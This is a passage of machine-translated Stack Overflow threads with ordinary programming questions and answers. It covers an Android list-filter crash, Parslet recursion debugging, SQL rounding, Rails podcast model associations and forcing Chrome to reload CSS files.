        holder = new ViewHolder();
        holder.txt_custName = (TextView) convertView.findViewById(R.id.customer_name);
        holder.txt_custEmail = (TextView) convertView.findViewById(R.id.customer_email);
        holder.txt_custId = (TextView) convertView.findViewById(R.id.customer_id);

        convertView.setTag(holder);
    } else {
        holder = (ViewHolder) convertView.getTag();
    }

    holder.txt_custName.setText(CustArrayList.get(position).name);
    holder.txt_custEmail.setText(CustArrayList.get(position).email1);
    holder.txt_custId.setText(CustArrayList.get(position).pkid.toString());

    return convertView;
}

static class ViewHolder {
    TextView txt_custName;
    TextView txt_custEmail;
    TextView txt_custId;
}

@Override
public Filter getFilter()
{
    Filter filter = new Filter()
   {
        @Override
        protected FilterResults performFiltering(CharSequence charSequence)
        {
            FilterResults results = new FilterResults();

            //If there's nothing to filter on, return the original data for your list
            if(charSequence == null || charSequence.length() == 0)
            {
                results.values = CustArrayList;
                results.count = CustArrayList.size();
            }
            else
            {
                ArrayList<CustAccountObject> filterResultsData = new ArrayList<CustAccountObject>();
                String filterString = charSequence.toString().toLowerCase();
                String filterableString;

                for(int i=0; i<CustArrayList.size(); i++)
                {
                    filterableString = CustArrayList.get(i).toString();
                    if(filterableString.toLowerCase().contains(filterString)){
                        filterResultsData.add(CustArrayList.get(i));
                    }
                }            

                results.values = filterResultsData;
                results.count = filterResultsData.size();
            }

            return results;
        }

        @Override
        protected void publishResults(CharSequence charSequence, FilterResults filterResults)
        {
            CustArrayList = (ArrayList<CustAccountObject>)filterResults.values;
            notifyDataSetChanged();
        }
    };
    return filter;
}
    } 
```

这是我的活动：

```
 inputSearch.addTextChangedListener(new TextWatcher() {

        @Override
        public void onTextChanged(CharSequence cs, int arg1, int arg2, int arg3) {
            // When user changed the Text
                             CustomerListActivity.this.adapter.getFilter().filter(cs);
        }

        @Override
        public void beforeTextChanged(CharSequence arg0, int arg1, int arg2,
                int arg3) {
            // TODO Auto-generated method stub
        }

        @Override
        public void afterTextChanged(Editable arg0) {
            // TODO Auto-generated method stub
        }
    }); 
```

我已经尝试过调试，但是在使用此`inputSearch.addTextChangedListener(new TextWatcher()`代码后，应用程序崩溃了。

我的日志猫：

```
03-22 04:20:00.644: E/Trace(20950): error opening trace file: No such file or directory (2)
03-22 04:20:01.335: E/AndroidRuntime(20950): FATAL EXCEPTION: main
03-22 04:20:01.335: E/AndroidRuntime(20950): java.lang.RuntimeException: Unable to instantiate application asia.wavelet.android.application.MyApp: java.lang.NullPointerException
03-22 04:20:01.335: E/AndroidRuntime(20950):    at android.app.LoadedApk.makeApplication(LoadedApk.java:504)
03-22 04:20:01.335: E/AndroidRuntime(20950):    at android.app.ActivityThread.handleBindApplication(ActivityThread.java:4364)
03-22 04:20:01.335: E/AndroidRuntime(20950):    at android.app.ActivityThread.access$1300(ActivityThread.java:141)
03-22 04:20:01.335: E/AndroidRuntime(20950):    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1294)
03-22 04:20:01.335: E/AndroidRuntime(20950):    at android.os.Handler.dispatchMessage(Handler.java:99)
03-22 04:20:01.335: E/AndroidRuntime(20950):    at android.os.Looper.loop(Looper.java:137)
03-22 04:20:01.335: E/AndroidRuntime(20950):    at android.app.ActivityThread.main(ActivityThread.java:5039)
03-22 04:20:01.335: E/AndroidRuntime(20950):    at java.lang.reflect.Method.invokeNative(Native Method)
03-22 04:20:01.335: E/AndroidRuntime(20950):    at java.lang.reflect.Method.invoke(Method.java:511)
03-22 04:20:01.335: E/AndroidRuntime(20950):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:793)
03-22 04:20:01.335: E/AndroidRuntime(20950):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:560)
03-22 04:20:01.335: E/AndroidRuntime(20950):    at dalvik.system.NativeStart.main(Native Method)
03-22 04:20:01.335: E/AndroidRuntime(20950): Caused by: java.lang.NullPointerException
03-22 04:20:01.335: E/AndroidRuntime(20950):    at android.app.LoadedApk.initializeJavaContextClassLoader(LoadedApk.java:379)
03-22 04:20:01.335: E/AndroidRuntime(20950):    at android.app.LoadedApk.getClassLoader(LoadedApk.java:322)
03-22 04:20:01.335: E/AndroidRuntime(20950):    at android.app.LoadedApk.makeApplication(LoadedApk.java:496)
03-22 04:20:01.335: E/AndroidRuntime(20950):    ... 11 more
03-22 04:21:10.265: E/AndroidRuntime(20984): FATAL EXCEPTION: main
03-22 04:21:10.265: E/AndroidRuntime(20984): java.lang.NullPointerException
03-22 04:21:10.265: E/AndroidRuntime(20984):    at asia.wavelet.android.customer.CustomerListActivity$RetreiveCustomer.onPostExecute(CustomerListActivity.java:237)
03-22 04:21:10.265: E/AndroidRuntime(20984):    at asia.wavelet.android.customer.CustomerListActivity$RetreiveCustomer.onPostExecute(CustomerListActivity.java:1)
03-22 04:21:10.265: E/AndroidRuntime(20984):    at android.os.AsyncTask.finish(AsyncTask.java:631)
03-22 04:21:10.265: E/AndroidRuntime(20984):    at android.os.AsyncTask.access$600(AsyncTask.java:177)
03-22 04:21:10.265: E/AndroidRuntime(20984):    at android.os.AsyncTask$InternalHandler.handleMessage(AsyncTask.java:644)
03-22 04:21:10.265: E/AndroidRuntime(20984):    at android.os.Handler.dispatchMessage(Handler.java:99)
03-22 04:21:10.265: E/AndroidRuntime(20984):    at android.os.Looper.loop(Looper.java:137)
03-22 04:21:10.265: E/AndroidRuntime(20984):    at android.app.ActivityThread.main(ActivityThread.java:5039)
03-22 04:21:10.265: E/AndroidRuntime(20984):    at java.lang.reflect.Method.invokeNative(Native Method)
03-22 04:21:10.265: E/AndroidRuntime(20984):    at java.lang.reflect.Method.invoke(Method.java:511)
03-22 04:21:10.265: E/AndroidRuntime(20984):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:793)
03-22 04:21:10.265: E/AndroidRuntime(20984):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:560)
03-22 04:21:10.265: E/AndroidRuntime(20984):    at dalvik.system.NativeStart.main(Native Method) 
```

我的 AsyncTask 类：

```
 class RetreiveCustomer extends AsyncTask<Void,Void,String> {

protected void onPreExecute() {
      //display progress dialog.

 }
protected String doInBackground(Void... params) {
    String json = null;
    try {
        boolean fromLocal = true;
        if(isOnline(getApplicationContext())) {
            try {
                URL url = new URL("http://192.168.0.177:8080/ws/api/customer/5");
                HttpURLConnection con = (HttpURLConnection) url.openConnection();
                int response = con.getResponseCode();
                if (response == HttpURLConnection.HTTP_OK) {
                    json = readStream(con.getInputStream());
                    fromLocal = false;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        } 
        if(fromLocal) {
                Collection custCol = new Vector();
                custCol = custBean.query(null, null, null, CustAccountBean.NAME);
                Gson gson = new Gson();
                json = gson.toJson(custCol);
            }
          } catch (Exception e) {
          e.printStackTrace();
        }
    return json;
}

private String readStream(InputStream in) {
      BufferedReader reader = null;
      String line = null;
    try {
        reader = new BufferedReader(new InputStreamReader(in));
        line = reader.readLine();
      } catch (IOException e) {
        e.printStackTrace();
      } finally {
        if (reader != null) {
          try {
            reader.close();
          } catch (IOException e) {
            e.printStackTrace();
            }
        }
      }
    return line;
    }

protected void onPostExecute(String result) {
    Collection custCol = new Vector();
    Gson gson = new Gson();
    Type token = new TypeToken<Collection<CustAccountObject>>() {}.getType();
    custCol = gson.fromJson(result, token);
    //      List<CustAccountObject> customers = new ArrayList<CustAccountObject>(custCol);
    //
    //      lv = (ListView) findViewById(R.id.list);
    //      inputSearch = (EditText) findViewById(R.id.customer_search);
    //
    //      // Adding customers to listview
    //      adapter = new ArrayAdapter<CustAccountObject>(getApplicationContext(), R.layout.list, R.id.name, customers);
    //      lv.setAdapter(adapter);

    ArrayList<CustAccountObject> cust_details = GetSearchResults(custCol);

    lv = (ListView) findViewById(R.id.list);
    adapter = new CustomerListBaseAdapter(getApplicationContext(), cust_details);
    lv.setAdapter(adapter);

    //      inputSearch.addTextChangedListener(new TextWatcher() {
    //
    //          @Override
    //          public void onTextChanged(CharSequence cs, int arg1, int arg2, int arg3) {
    //              // When user changed the Text
    //                             CustomerListActivity.this.adapter.getFilter().filter(cs);
    //          }
    //
    //          @Override
    //          public void beforeTextChanged(CharSequence arg0, int arg1, int arg2,
    //                  int arg3) {
    //              // TODO Auto-generated method stub
    //          }
    //
    //          @Override
    //          public void afterTextChanged(Editable arg0) {
    //              // TODO Auto-generated method stub
    //          }
    //      });

    lv.setOnItemClickListener(new OnItemClickListener() {
        public void onItemClick(AdapterView<?> l, View v, int position, long id) {
            CustAccountObject custObj = (CustAccountObject) adapter.getItem(position);
            customerEdit(custObj.pkid);
        }
    });
}

public boolean isOnline(Context context) {
    ConnectivityManager cm = (ConnectivityManager) getSystemService(context.CONNECTIVITY_SERVICE);
    NetworkInfo netInfo = cm.getActiveNetworkInfo();
    if (netInfo != null && netInfo.isConnectedOrConnecting()) {
        return true;
    }
    return false;
}

private ArrayList<CustAccountObject> GetSearchResults(Collection custCol){
    ArrayList<CustAccountObject> results = new ArrayList<CustAccountObject>();
    Vector vecResult = new Vector(custCol);
    CustAccountObject custObj = new CustAccountObject();
    for(int i=0; i<vecResult.size(); i++)
    {
        custObj = (CustAccountObject) vecResult.get(i);
        results.add(custObj);
    }
    return results;
}
} 
```

# ruby - Parslet：SystemStackError：堆栈级别太深

> ID：15562362
> 
> 赞同：1
> 
> 时间：2013-03-22T03:42:52.923
> 
> 标签：ruby, parslet

我正在研究一种新的编程语言[*rip*](https://github.com/rip-lang/rip)，但我无法深入到一些无限循环的底部。有没有办法在每个规则被调用时打印出来，这样我就可以看到正在递归的规则？我试过在脑海中浏览代码，但我没有看到它。任何帮助将非常感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-31T08:00:29.247

充实[Raving Genius 的答案](https://stackoverflow.com/a/15651440/578288)：

打补丁的方法其实是`Parslet::Atoms::Context#lookup`。[在 GitHub 上查看](https://github.com/kschiess/parslet/blob/master/lib/parslet/atoms/context.rb#L96)（[永久链接到当前版本](https://github.com/kschiess/parslet/blob/9d59363f14b0292676187287bee25d7b5ad06aa0/lib/parslet/atoms/context.rb#L96)）。在您自己的代码中，您可以修补该方法以打印`obj`如下：

```
class Parslet::Atoms::Context
  def lookup(obj, pos)
    p obj
    @cache[pos][obj.object_id]
  end
end 
```

在调用解析器之前随时运行该代码`parse`，它将生效。样本输出：

```
>> parser = ConsistentNewlineTextParser.new
=> LINES
>> parser.parse("abc")
LINES
(line_content:LINE_CONTENT NEWLINE){0, } line_content:LINE_CONTENT
(line_content:LINE_CONTENT NEWLINE){0, }
line_content:LINE_CONTENT NEWLINE
LINE_CONTENT
WORD
\\w{0, }
\\w
\\w
\\w
\\w
NEWLINE
dynamic { ... }
FIRST_NEWLINE
'? '
'
'?
'
'
'
LINE_CONTENT
=> {:line_content=>"abc"@0} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T03:31:39.570

我想通了：编辑`Parslet::Atom::Context#lookup`以输出`obj`参数将在调用每个规则时显示它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-10-14T12:07:43.960

[我的 Parslet 分支](https://github.com/nigelthorne/parslet)自动检测无限循环，并退出重复的报告表达式而不消耗任何东西。

[https://github.com/nigelthorne/parslet](https://github.com/nigelthorne/parslet)

有关示例，请参阅[Parse markdown 缩进代码块。](https://stackoverflow.com/questions/30485292/parse-markdown-indented-code-block)

# sql - SQL十进制转换

> ID：15562363
> 
> 赞同：0
> 
> 时间：2013-03-22T03:42:54.060
> 
> 标签：sql, sql-server, decimal

我在转换这个十进制值时遇到了一些问题，如下所示：

```
21.6080402010050 
```

谁能帮我把它转换成`21.6`?

我已经尝试过了，但它不起作用。

```
(convert(decimal(10, 2), SUM(t1.TOTAL)) 
```

这是查询

```
SELECT 
    t1.LINE_NO, t1.E_FIELD, t1.F_FIELD, t1.G_FIELD, t1.HSA_STATUS, 
    t1.FAMILY, t1.CACHE_FAMILY, 
    SUM(t1.TOTAL) AS CountOfLineNo, t2.TotalOfLineNo, 
    (convert(decimal(8,1), SUM(t1.TOTAL)) * 100 / t2.TotalOfLineNo ) AS Percentage
FROM (
    SELECT 
        LINE_NO, E_FIELD,F_FIELD,G_FIELD,HSA_STATUS,FAMILY,CACHE_FAMILY, 
        Count(LINE_NO) as Total
    FROM TX_HSA_SUMM
    WHERE MT_TIMESTAMP2 BETWEEN ('2013-03-07 10:10:00') AND ('2013-03-08 10:20:00')
    GROUP BY LINE_NO, E_FIELD, F_FIELD, G_FIELD, HSA_STATUS, FAMILY, CACHE_FAMILY) AS t1 
LEFT JOIN (
      SELECT LINE_NO, COUNT(LINE_NO) AS TotalOfLineNo
      FROM TX_HSA_SUMM
      WHERE MT_TIMESTAMP2 BETWEEN ('2013-03-07 10:10:00') AND ('2013-03-08 10:20:00')
      GROUP BY LINE_NO) AS t2 ON t1.LINE_NO = t2.LINE_NO
GROUP BY 
   t1.LINE_NO, t1.E_FIELD, t1.F_FIELD, t1.G_FIELD, t1.HSA_STATUS, t1.FAMILY, 
   t1.CACHE_FAMILY, t1.Total, t2.TotalOfLineNo
ORDER BY 
   t1.LINE_NO, t1.E_FIELD, t1.F_FIELD, t1.G_FIELD, t1.HSA_STATUS, t1.FAMILY, 
   t1.CACHE_FAMILY, t1.Total, t2.TotalOfLineNo 
```

输出是

```
LINE_NO E_FIELD F_FIELD G_FIELD HSA_STATUS FAMILY CACHE_FAMILY CountOfLineNo    TotalOfLineNo   Percentage
23053B  00000   00000   00000   S   SUMMIT  WER 43  199 21.608040201005% 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T05:16:24.170

请尝试以下查询

```
SELECT t1.LINE_NO, t1.E_FIELD, t1.F_FIELD, t1.G_FIELD, t1.HSA_STATUS, t1.FAMILY, t1.CACHE_FAMILY, 
    SUM(t1.TOTAL) AS CountOfLineNo, t2.TotalOfLineNo, convert(decimal(18,1),(convert(decimal(8,1),SUM(t1.TOTAL)) * 100 / t2.TotalOfLineNo)) AS Percentage
    FROM (
          SELECT LINE_NO, E_FIELD,F_FIELD,G_FIELD,HSA_STATUS,FAMILY,CACHE_FAMILY, Count(LINE_NO) as Total
          FROM TX_HSA_SUMM
          WHERE MT_TIMESTAMP2 BETWEEN ('2013-03-07 10:10:00') AND ('2013-03-08 10:20:00')
          GROUP BY LINE_NO,E_FIELD,F_FIELD,G_FIELD,HSA_STATUS,FAMILY,CACHE_FAMILY
        ) AS t1 
    LEFT JOIN (
          SELECT LINE_NO, COUNT(LINE_NO) AS TotalOfLineNo
          FROM TX_HSA_SUMM
          WHERE MT_TIMESTAMP2 BETWEEN ('2013-03-07 10:10:00') AND ('2013-03-08 10:20:00')
          GROUP BY LINE_NO
          ) AS t2 
      ON t1.LINE_NO = t2.LINE_NO
    GROUP BY t1.LINE_NO, t1.E_FIELD, t1.F_FIELD, t1.G_FIELD, t1.HSA_STATUS, t1.FAMILY, t1.CACHE_FAMILY, t1.Total,t2.TotalOfLineNo
    ORDER BY t1.LINE_NO, t1.E_FIELD, t1.F_FIELD, t1.G_FIELD, t1.HSA_STATUS, t1.FAMILY, t1.CACHE_FAMILY, t1.Total,t2.TotalOfLineNo 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T03:49:12.303

这应该适合你：

```
SELECT ROUND(21.6080402010050,1) 
```

[SQL 小提琴演示](http://sqlfiddle.com/#!3/d41d8/11412)

它应该适用于大多数 RDBMS。

通过您的编辑：

```
ROUND((convert(decimal(8,1),SUM(t1.TOTAL)) * 100 / t2.TotalOfLineNo ),1) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T03:49:15.610

使用**[圆](http://msdn.microsoft.com/en-IN/library/ms175003.aspx)**函数

```
select round(21.6080402010050,1) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-22T03:49:19.163

看看`ROUND`功能。

```
select round(21.6080402010050, 1) 
```

适用于 MS SQL Server 或 MySQL

# cocoa-touch - ipad将tableview（仅一部分）添加到带有情节提要的viewcontroller

> ID：15562366
> 
> 赞同：0
> 
> 时间：2013-03-22T03:43:13.147
> 
> 标签：cocoa-touch, uitableview, uiviewcontroller, uistoryboard

所以我试图在我的 ipad 应用程序的下半部分添加一个 UITableView，用于显示搜索结果。我就是这样做的。

1.  我添加了一个 UIView
2.  我在 UIView 上添加了一个 UItableView
3.  然后我将 UITableView 拖到 ViewController 上，以便它可以连接到它以获取委托和数据源。

这是它目前的样子：

（它在中间的顶行）

![在此处输入图像描述](../Images/fcc82bdd1f78eb990846cac5a349da04.png)

所以我将以下内容添加到 viewcontroller 类中以生成数据

```
# pragma mark TableView properties

- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView
{
    return 1;
}
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
    return 2;
}
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    static NSString *CellIdentifier = @"SearchResultCell";

    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];

    if(cell == nil)
    {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];

    }

    cell.textLabel.text = @"test";
} 
```

调试器会经历所有这些，但会在“cellForRowAtIndexPath”方法之后卡住：

![在此处输入图像描述](../Images/bc7e5e8d19073e19f2552f25ed52a609.png)

它只会经历这些，直到我停止整个调试才会结束。不太清楚发生了什么。

想法？也许你们可以指出我应该如何生成搜索结果的正确方向。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-23T22:20:11.540

我通常发现使用免费的 Sensible TableView 框架进行自动表格视图搜索会更快更容易，而不是使用我永远无法正确使用的常规数据源/委托系统。

# jpa - Griffon & JPA：persistence.xml 中的环境配置

> ID：15562370
> 
> 赞同：0
> 
> 时间：2013-03-22T03:44:35.557
> 
> 标签：jpa, groovy, griffon

使用 Griffon 1.2 和 JPA 有没有办法使用环境属性配置 persistence.xml - 所以我可以为 dev/test/prod 使用不同的 jdbc.url ？

即conf/metainf/persistence.xml

```
 <property name="javax.persistence.jdbc.url"      value="${javax.persistence.jdbc.url}" /> 
```

我希望这样的事情可以在 JpaConfig.groovy

```
environments {
    development {
        persistenceUnit {
            entityManager {
                // EntityManager properties go here
                javax.persistence.jdbc.url = 'jdbc:h2:mem:sample'
            }
        }
    }... 
```

我可以创建多个重复的持久性 xml 文件，并且我相信我可以在 JpaConfig.groovy 中指定活动的持久性单元。或者是否有其他方法来参数化每个环境的 JPA 配置？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T09:48:30.377

恐怕目前不支持可参数化的 persistence.xml 文件，因为这些文件从未被插件触及；然而，这将是插件的一个很好的补充。[您愿意在http://jira.codehaus.org/browse/griffon](http://jira.codehaus.org/browse/griffon)注册一张票吗？

同时，在 JpaConfig.groovy 中设置所有相关属性是实现此目的的唯一方法。

# javascript - 如何在 Javascript 中提取本地图像的元数据？

> ID：15562372
> 
> 赞同：5
> 
> 时间：2013-03-22T03:44:46.117
> 
> 标签：javascript, image, metadata

我想获取用户拖放到网页中的图像的元数据。我有拖放设置。但是，图像实际上并未上传到服务器。它在本地访问。我仍然可以使用 Javascript 从图像中获取元数据吗？如果是这样，我该怎么做？有什么好的图书馆？

如果不是，我是否必须上传图像才能提取元数据？用 Javascript 上传图片的最快方法是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-22T03:59:01.733

有一个库：[ImageInfo - 使用 JavaScript 读取图像元数据](http://blog.nihilogic.dk/2008/08/imageinfo-reading-image-metadata-with.html)。[在 HTML5](http://wizard.ae.krakow.pl/~jb/localio.html)中的本地文件访问和本地文件访问之间，您应该能够获得它。

**更新**[imageinfo 库](https://developer.chrome.com/extensions/examples/extensions/imageinfo/imageinfo/imageinfo.js) 的新链接。

* * *

## 回答 #2

> 赞同：-5
> 
> 时间：2013-03-22T04:18:30.703

基本上，JavaScript 无法“触摸”您的本地文件，您只需使用[HTML5](http://www.html5rocks.com/en/tutorials/file/filesystem/) + JavaScript 或使用 Flash ActionScript即可

# ruby-on-rails - 播客目录的 Rails 模型关联（Polymoprhic 或 HABTM）

> ID：15562380
> 
> 赞同：0
> 
> 时间：2013-03-22T03:45:52.090
> 
> 标签：ruby-on-rails, has-many-through, polymorphic-associations, model-associations, podcast

我正在创建一个应用程序，它将成为播客/广播节目的目录（主要是每个节目的节目说明）。我被困在如何在这个应用程序中为人物建模，主要是因为一个人既可以是*许多*不同剧集的嘉宾（在许多不同的节目中），也可以是主持人（在每一集都有特色的人）给定节目）。

示例：Marco Arment 是“构建和分析”节目的主持人，但偶尔会作为嘉宾出现在其他播客中（例如“格鲁伯脱口秀”或“科技周刊”）。

到目前为止，我的数据模型如下所示（关注主持人/嘉宾剧集/节目关系）。我不确定如何处理 Person/Guest/Host 建模，但我确定我想将“Guest”和“Host”的角色作为应用程序中的单独项目保留。

```
Episode
  title:string
  has_many :guests

Show
  title:string
  has_many :hosts

Host
  show_id:integer
  person_id:integer
  belongs_to :show

Guest
  episode_id:integer
  person_id:integer
  belongs_to :episode

People
  name:string
  # ??? 
```

我是否应该摆脱“主持人”和“客人”模型，而是根据剧集或节目是否询问与他们相关的人来确定这些卷？请记住，“节目”只能有主持人，“剧集”只能有嘉宾——但嘉宾和主持人始终是人（姓名、传记、推特句柄等）。

谢谢。我探索了多态关联和 has_many :through 并且不确定使用哪个，如果有的话。

**更新#1**

在睡了这个之后，我对如何在早上处理它有了一些更好的想法。与下面@Emm 的回复类似，“Host”和“Guest”应该只是通过单独模型的 Person 的某种品质，这似乎很自然。这是我对模型结构的新思考，我在看到下面的任何响应之前设置了它。

这里的关键区别在于“外观”模型将有一个“角色”列（字符串），我可以在其中设置与该行关联的 person_id 是该行的 episode_id 或 show_id 的“guest”还是“host”。

```
class Appearanceship
  # person_id:integer
  # episode_id:integer
  # show_id:integer
  # role:string
  belongs_to :people
  belongs_to :episodes
  belongs_to :shows
end

class Person
  # name, bio, profile pic, twitter name, etc
  has_many :appearanceships
  has_many :episodes, :through => :appearanceships
  has_many :shows, :through => :appearanceships
end

class Episode
  # title, summary, date recorded, mp3 URL, web URL, etc
  has_many :appearanceships
  has_many :people, :through => :appearanceships
end

class Show
  # title, description, web URL, RSS URL, etc
  has_many :appearanceships
  has_many :people, :through => :appearanceships
end

class Network
  # e.g., "NPR", "5by5", "Mule Radio Syndicate", "Revision3"
  # title, description, web URL, etc
  has_many :shows
end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T04:04:47.960

你只是在谈论两种不同的模型，所以我会保持简单。让我们把`People`, `Host`, 和组合`Guest`成`Person`; 让我们将`Episode`和`Show`合并为`Podcast`。您可以在别处定义主机和来宾之间的角色差异。

```
class Person < ActiveRecord::Base
  attr_accessible :name, :biography, :twitter
  has_many :podcasts
  has_many :podcasts, :through => :roles
end

class Podcast < ActiveRecord::Base
  attr_accessible :title
  has_many :persons
  has_many :persons, :through => :roles
end

class Role < ActiveRecord::Base
  attr_accessible :variety
  belongs_to :podcast
  belongs_to :person
end 
```

并存储在`variety`和`Role`之间的关系类型`Person`中`Podcast`。这可能是一个类似`"host"`or的字符串`"guest"`，或者您甚至可以创建另一个模型来调用`Variety`它来管理它（因此存储`variety_id`而不是`variety`in `Role`）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T04:05:33.830

节目通过主机有很多用户

节目有很多集

剧集通过客人有很多用户

```
class User < ActiveRecord::Base
  has_many :shows, :through => :show_hosts
  has_many :show_hosts

  has_many :episodes, :through => :show_guests
  has_many :show_guests
end 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T04:08:02.183

更好的选择是不将 Host 和 guest 分开，Guest 可以使用 HABTM 定义为自引用关系。

你的模型定义看起来像这样，

```
class Host < ActiveRecord::Base
  has_and_belongs_to_many :guest, 
      :join_table => 'guests' #This is HABTM join table that you will have to create
      :foreign_key => 'host_id'
      :association_foreign_key => 'guest_id'
      :class_name => 'Host'

#The migration will look like this,
def change
  create_table :guests :id => false do |t|
    t.integer :host_id,  :null => false
    t.integer :guest_id, :null => false
  end
  add_index :guests, [:host_id, :guest_id]
end 
```

# css - 在 Visual Studio 中调试时如何强制 Chrome 浏览器重新加载 .css 文件？

> ID：15562384
> 
> 赞同：165
> 
> 时间：2013-03-22T03:46:24.797
> 
> 标签：css, visual-studio, google-chrome, caching

我目前正在 Visual Studio 2012 中编辑一个 .css 文件（在调试模式下）。我使用 Chrome 作为我的浏览器。当我在 Visual Studio 中更改我的应用程序的 .css 文件并保存时，刷新页面将不会加载我的 .css 文件中的更新更改。我认为 .css 文件仍然被缓存。

我试过了：

1.  CTRL / F5
2.  在 Visual Studio 2012 中，转到项目属性，Web 选项卡在开始操作部分中选择启动外部程序粘贴或浏览到 Google Chrome 的路径（我的是 C:\Users\xxx\AppData\Local\Google\Chrome\Application\ chrome.exe) 在命令行参数框中输入 -incognito
3.  使用Chrome开发者工具，点击“齿轮”图标，勾选“禁用缓存”。

除非我手动停止调试（关闭 Chrome），重新启动应用程序（在调试中），否则似乎没有任何效果。

有什么方法可以强制 Chrome 始终重新加载所有 css 更改并重新加载 .css 文件？

更新：
1\. 我的 .aspx 文件中的内联样式更改在我刷新时被拾取。但是 .css 文件中的更改不会。2\. 它是一个 ASP.NET MVC4 应用程序，所以我单击一个超链接，它执行 GET。这样做，我没有看到对样式表的新请求。但是点击 F5，.css 文件被重新加载并且状态码（在网络选项卡上）是 200。

* * *

## 回答 #1

> 赞同：238
> 
> 时间：2013-05-06T16:48:42.353

强制 chrome 重新加载 css 和 js：

Windows 选项 1：`CTRL`+ `SHIFT`+ `R`
Windows 选项 2：`SHIFT`+`F5`

操作系统：`⌘</kbd> + `SHIFT` + `R``

> 如@PaulSlocum 在评论中所述更新（并且许多已确认）

* * *

*原答案：*

Chrome 改变了行为。`Ctrl`+`R`会做的。

在 OS X 上：`⌘</kbd> + `R``

> 如果您在重新加载 css/js 文件时遇到问题，请在重新加载之前打开检查器 ( `CTRL`++ `SHIFT`) `C`。

* * *

## 回答 #2

> 赞同：159
> 
> 时间：2013-03-22T04:28:54.233

有更复杂的解决方案，但一个非常简单的解决方案就是将随机查询字符串添加到您的 CSS 包含中。

如`src="/css/styles.css?v={random number/string}"`

如果您使用 php 或其他服务器端语言，您可以使用`time()`. 所以它会是`styles.css?v=<?=time();?>`

这样，查询字符串每次都是新的。就像我说的那样，有更复杂的解决方案更具动态性，但在测试目的中，这种方法是顶级的（IMO）。

* * *

## 回答 #3

> 赞同：151
> 
> 时间：2014-02-10T04:53:24.420

[阅读下面的更新]

我发现最简单的方法是在 Chrome DevTools 设置中。单击 DevTools 右上角的齿轮图标（或 3 个垂直点，在较新的版本中）以打开“设置”对话框。在那里，勾选框：“禁用缓存（当 DevTools 打开时）”

* * *

更新：现在这个设置已经被移动了。它可以在“网络”选项卡中找到，它是一个标有“禁用缓存”的复选框。 [![在此处输入图像描述](../Images/b7f117e15b8be9b90e1cd865bd5b378f.png)](https://i.stack.imgur.com/JxsDD.png)

* * *

## 回答 #4

> 赞同：11
> 
> 时间：2013-03-22T04:28:51.313

您正在处理浏览器缓存的问题。

禁用页面本身的缓存。这不会在浏览器/缓存中保存页面的支持文件。

```
<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1990 12:00:00 GMT" /> 
```

您需要/需要在`head`您正在调试的页面的标签或您的网站的`head`标签 `master page`中插入此代码

这将不允许浏览器缓存文件，最终文件不会存储在浏览器临时文件中，所以没有缓存，所以不需要重新加载:)

我相信这会做:)

* * *

## 回答 #5

> 赞同：8
> 
> 时间：2014-10-02T02:34:50.547

就我而言，在 Chrome DevTools 设置中，仅设置“禁用缓存（DevTools 打开时）”不起作用，它需要检查源代码中列出的“启用 CSS 源映射”和“自动重新加载生成的 CSS”组，以使此缓存问题消失。

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2016-11-23T21:22:19.767

按`SHIFT`+ `F5`。

它适用于我的 Chrome 版本 54。

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2017-01-29T14:21:12.433

我在这里遇到了同样的问题！但我敢肯定，我的分辨率比上面所有的例子都好，就这样做，

1.  按 F12 调出 Chrome 开发者控制台
2.  右键单击浏览器顶部的重新加载按钮，然后选择“清空缓存和硬重新加载”。

就是这样！

* * *

## 回答 #8

> 赞同：5
> 
> 时间：2017-03-27T18:45:42.793

使用 macOS，我可以强制 Chrome 重新加载 CSS 文件

`⌘</kbd> + `SHIFT` + `R``

[在这里](https://stackoverflow.com/a/16403336/3511819)的评论中发现了这个答案，但它值得更多的曝光。

* * *

## 回答 #9

> 赞同：4
> 
> 时间：2020-03-19T20:28:20.590

我正在使用**Edge**版本 81.0.416.64（官方版本）（64 位）及其基于 Chromium 开源项目的版本。

按`F12`进入开发工具。
单击网络选项卡
检查禁用缓存

[![在此处输入图像描述](../Images/818a0f932f7f2098d15bff706c2df7e0.png)](https://i.stack.imgur.com/Zjaih.jpg)

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2017-01-15T15:55:14.763

当前版本的 Chrome (55.x) 不会在您重新加载页面 (Command + R) 时重新加载所有资源 - 这对于调试 .css 文件没有用处。

如果您只想调试 .html、.php、.etc 文件，Command + R 可以正常工作，并且速度更快，因为可以使用本地/缓存资源（.css、.js）。为每次调试迭代手动删除浏览器的缓存并不方便。

在 Mac 上强制重新加载 .css 文件的程序（键盘快捷键/Chrome）：Command + Shift + R

* * *

## 回答 #11

> 赞同：2
> 
